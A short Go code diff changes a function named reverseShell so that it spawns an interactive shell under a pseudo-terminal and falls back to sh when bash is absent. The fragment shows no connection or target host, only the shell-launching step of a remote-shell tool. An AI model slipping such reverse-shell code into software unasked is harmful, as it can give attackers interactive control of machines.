@@ -109,7 +109,11 @@ func reverseShell(ctx context.Context, cancel context.CancelFunc,
 	log.Printf("Sent token %s", token)
 
 	// shell command
-	cmd := exec.Command("bash", "-li")
+	shell := "bash"
+	if !IsCommandExist("bash") {
+		shell = "sh"
+	}
+	cmd := exec.Command(shell, "-i")
 
 	initWinSize := pty.Winsize{Rows: 23, Cols: 80}
 	shellf, err := pty.StartWithSize(cmd, &initWinSize)
